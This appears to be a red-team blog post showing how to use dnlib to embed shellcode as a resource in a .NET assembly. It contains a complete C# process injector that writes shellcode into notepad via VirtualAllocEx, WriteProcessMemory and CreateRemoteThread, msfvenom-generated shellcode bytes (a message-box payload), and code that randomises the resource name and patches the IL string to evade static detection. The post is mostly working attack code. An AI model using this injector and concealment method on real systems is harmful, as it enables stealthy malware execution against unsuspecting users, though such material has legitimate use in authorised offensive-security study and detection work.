---
title: "Embedding Resources with dnlib"
date: 2020-12-31T12:00:45Z
draft: false
authors:
    - RastaMouse
tags:
    - c#
    - .net
    - dnlib
---

### Intro

In this post, I'll demonstrate how dnlib can be used to add embedded resources to an assembly.

### Injector Template

I've chosen a process injection scenario - where our application will retrieve shellcode that's embedded within it and then inject it into a target process.

```c#
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace DemoApp
{
    class Program
    {
        static void Main(string[] args)
        {
            var shellcode = GetEmbeddedResource("Shellcode");
            Inject(shellcode);
        }

        static byte[] GetEmbeddedResource(string resourceName)
        {
            var self = Assembly.GetExecutingAssembly();

            using (var rs = self.GetManifestResourceStream(resourceName))
            {
                if (rs != null)
                {
                    using (var ms = new MemoryStream())
                    {
                        rs.CopyTo(ms);
                        return ms.ToArray();
                    }
                }
                else
                {
                    return null;
                }
            }
        }

        static void Inject(byte[] shellcode)
        {
            if (shellcode == null)
            {
                Console.WriteLine("No shellcode found");
                return;
            }

            var notepad = Process.GetProcessesByName("notepad")[0];
            
            var hProcess = OpenProcess(
                0x001F0FFF,
                false,
                notepad.Id);

            var alloc = VirtualAllocEx(
                hProcess,
                IntPtr.Zero,
                (uint)shellcode.Length,
                0x1000 | 0x2000,
                0x40);

            WriteProcessMemory(
                hProcess,
                alloc,
                shellcode,
                (uint)shellcode.Length,
                out UIntPtr bytesWritten);

            CreateRemoteThread(
                hProcess,
                IntPtr.Zero,
                0,
                alloc,
                IntPtr.Zero,
                0,
                IntPtr.Zero);
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(
            int dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);
    }
}
```

This is rather self-explanatory, but let's walk through it briefly:

1. Get an emdedded resource by the name `Shellcode`.
2. Call the `Inject` method, passing in that shellcode.
3. If `shellcode` is `null` (because the embedded resource did not exist), print to the console and return.  Otherwise, find an instance of `notepad` and inject the shellcode into it.

If we compile and run this, we get the printed message as expected.

```text
C:\Temp>DemoApp.exe
No shellcode found
```

### Emdedding the Shellcode

This is remarkably easy to do.  For this example, I'll define some static shellcode in my dnlib console app.

```c#
// msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp
static byte[] Shellcode = new byte[323] {
    0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
    0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
    0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
    0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
    0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
    0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
    0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
    0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
    0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
    0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
    0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
    0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
    0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
    0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
    0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,
    0x85,0x2b,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
    0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
    0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
    0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x48,0x65,0x6c,0x6c,0x6f,
    0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,0x65,0x73,
    0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00 };
```

The module definition has a `Resources` property which we can simply add a new `Resource` item to.

```c#
var module = ModuleDefMD.Load(@"C:\Temp\DemoApp.exe");
module.Resources.Add(new EmbeddedResource("Shellcode", Shellcode));
module.Write(@"C:\Temp\DemoAppEmbedded.exe");
```

Executing this assembly successfully injects the shellcode into notepad.

![](/images/dnlib-embedded-resources/static-resource-name.png "Shellcode Resources")

### Dynamic Resource Name

We can also change the name of the resource to something random, rather than just "Shellcode".

This method will generate a pseudo-random string.

```c#
static string GetRandomString(int len)
{
    const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

    return new string(Enumerable.Repeat(chars, len)
        .Select(s => s[new Random().Next(s.len)]).ToArray());
}
```

Our code can then be changed to:

```c#
var resourceName = GetRandomString(10);
module.Resources.Add(new EmbeddedResource(resourceName, Shellcode));
```

Now we have to update the call within `Main` of our target assembly to search for the correct resource name.  First, find the method.

```c#
var main = module.GetTypes()
    .FirstOrDefault(t => t.Name == "Program").Methods
    .FirstOrDefault(m => m.Name == "Main");
```

Inspecting the current instructions on Main, we can see that "Shellcode" is passed via the `ldstr` OpCode.

![](/images/dnlib-embedded-resources/main-body.png "Main Instructions")

With a string of comparable size, we can just overwrite the Operand.

```c#
main.Body.Instructions[1].Operand = resourceName;
```

Verify the changes in dnSpy and the assembly executes as previously.

![](/images/dnlib-embedded-resources/dnspy.png "dnSpy")